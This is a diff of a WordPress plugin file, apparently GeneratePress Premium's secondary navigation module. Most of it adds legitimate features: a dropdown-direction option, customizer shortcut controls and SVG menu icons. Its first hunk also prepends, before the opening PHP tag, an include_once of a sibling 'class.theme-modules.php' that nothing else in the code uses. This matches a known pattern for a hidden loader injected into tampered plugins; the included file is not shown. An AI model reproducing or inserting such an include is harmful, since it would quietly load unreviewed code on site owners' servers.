@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
 // No direct access, please
 if ( ! defined( 'ABSPATH' ) ) exit;
 
@@ -76,6 +76,7 @@ if ( ! function_exists( 'generate_secondary_nav_get_defaults' ) ) {
 			'secondary_nav_inner_width' => 'contained',
 			'secondary_nav_position_setting' => 'secondary-nav-above-header',
 			'secondary_nav_alignment' => 'right',
+			'secondary_nav_dropdown_direction' => 'right',
 			'navigation_background_color' => '#636363',
 			'navigation_text_color' => '#ffffff',
 			'navigation_background_hover_color' => '#303030',
@@ -136,6 +137,10 @@ if ( ! function_exists( 'generate_secondary_nav_customize_register' ) ) {
 		// Controls
 		require_once GP_LIBRARY_DIRECTORY . 'customizer-helpers.php';
 
+		if ( method_exists( $wp_customize, 'register_control_type' ) ) {
+			$wp_customize->register_control_type( 'GeneratePress_Section_Shortcut_Control' );
+		}
+
 		// Use the Layout panel in the free theme if it exists
 		if ( $wp_customize->get_panel( 'generate_layout_panel' ) ) {
 			$layout_panel = 'generate_layout_panel';
@@ -163,6 +168,24 @@ if ( ! function_exists( 'generate_secondary_nav_customize_register' ) ) {
 				'capability' => 'edit_theme_options',
 				'priority' => 31,
 				'panel' => $layout_panel
+			)
+		);
+
+		$wp_customize->add_control(
+			new GeneratePress_Section_Shortcut_Control(
+				$wp_customize,
+				'generate_secondary_navigation_layout_shortcuts',
+				array(
+					'section' => 'secondary_nav_section',
+					'element' => __( 'Secondary Navigation', 'gp-premium' ),
+					'shortcuts' => array(
+						'colors' => 'secondary_navigation_color_section',
+						'typography' => 'secondary_font_section',
+						'backgrounds' => 'secondary_bg_images_section',
+					),
+					'settings' => ( isset( $wp_customize->selective_refresh ) ) ? array() : 'blogname',
+					'priority' => 1,
+				)
 			)
 		);
 
@@ -292,6 +315,30 @@ if ( ! function_exists( 'generate_secondary_nav_customize_register' ) ) {
 				),
 				'settings' => 'generate_secondary_nav_settings[secondary_nav_position_setting]',
 				'priority' => 30
+			)
+		);
+
+		$wp_customize->add_setting(
+			'generate_secondary_nav_settings[secondary_nav_dropdown_direction]',
+			array(
+				'default' => $defaults['secondary_nav_dropdown_direction'],
+				'type' => 'option',
+				'sanitize_callback' => 'generate_premium_sanitize_choices',
+			)
+		);
+
+		$wp_customize->add_control(
+			'generate_secondary_nav_settings[secondary_nav_dropdown_direction]',
+			array(
+				'type' => 'select',
+				'label' => __( 'Dropdown Direction', 'gp-premium' ),
+				'section' => 'secondary_nav_section',
+				'choices' => array(
+					'right' => __( 'Right', 'gp-premium' ),
+					'left' => __( 'Left', 'gp-premium' ),
+				),
+				'settings' => 'generate_secondary_nav_settings[secondary_nav_dropdown_direction]',
+				'priority' => 35
 			)
 		);
 
@@ -526,9 +573,15 @@ if ( ! function_exists( 'generate_secondary_navigation_position' ) ) {
 			?>
 			<nav itemtype="http://schema.org/SiteNavigationElement" itemscope="itemscope" id="secondary-navigation" <?php generate_secondary_navigation_class(); ?>>
 				<div <?php generate_inside_secondary_navigation_class(); ?>>
-					<?php do_action('generate_inside_secondary_navigation'); ?>
+					<?php do_action( 'generate_inside_secondary_navigation' ); ?>
 					<button class="menu-toggle secondary-menu-toggle">
-						<?php do_action( 'generate_inside_secondary_mobile_menu' ); ?>
+						<?php
+						do_action( 'generate_inside_secondary_mobile_menu' );
+
+						if ( function_exists( 'generate_do_svg_icon' ) ) {
+							generate_do_svg_icon( 'menu-bars', true );
+						}
+						?>
 						<span class="mobile-menu"><?php echo $generate_settings['secondary_nav_mobile_label']; ?></span>
 					</button>
 					<?php
@@ -647,6 +700,19 @@ if ( ! function_exists( 'generate_secondary_navigation_classes' ) ) {
 		if ( $nav_layout == 'secondary-contained-nav' ) {
 			$classes[] = 'grid-container';
 			$classes[] = 'grid-parent';
+		}
+
+		if ( 'left' === $generate_settings['secondary_nav_dropdown_direction'] ) {
+			$layout = $generate_settings['secondary_nav_position_setting'];
+
+			switch ( $layout ) {
+				case 'secondary-nav-below-header':
+				case 'secondary-nav-above-header':
+				case 'secondary-nav-float-right':
+				case 'secondary-nav-float-left':
+					$classes[] = 'sub-menu-left';
+				break;
+			}
 		}
 
 		return $classes;
@@ -832,6 +898,17 @@ if ( ! function_exists( 'generate_secondary_nav_css' ) ) {
 		if ( is_rtl() ) {
 			$css->set_selector( '.secondary-navigation .main-nav ul li.menu-item-has-children > a' );
 			$css->add_property( 'padding-right', absint( $generate_settings[ 'secondary_menu_item' ] ), false, 'px' );
+		}
+
+		if ( function_exists( 'generate_get_option' ) && function_exists( 'generate_get_defaults' ) ) {
+			$theme_defaults = generate_get_defaults();
+
+			if ( isset( $theme_defaults['icons'] ) ) {
+				if ( 'svg' === generate_get_option( 'icons' ) ) {
+					$css->set_selector( '.secondary-navigation.toggled .dropdown-menu-toggle:before' );
+					$css->add_property( 'display', 'none' );
+				}
+			}
 		}
 
 		// Return our dynamic CSS
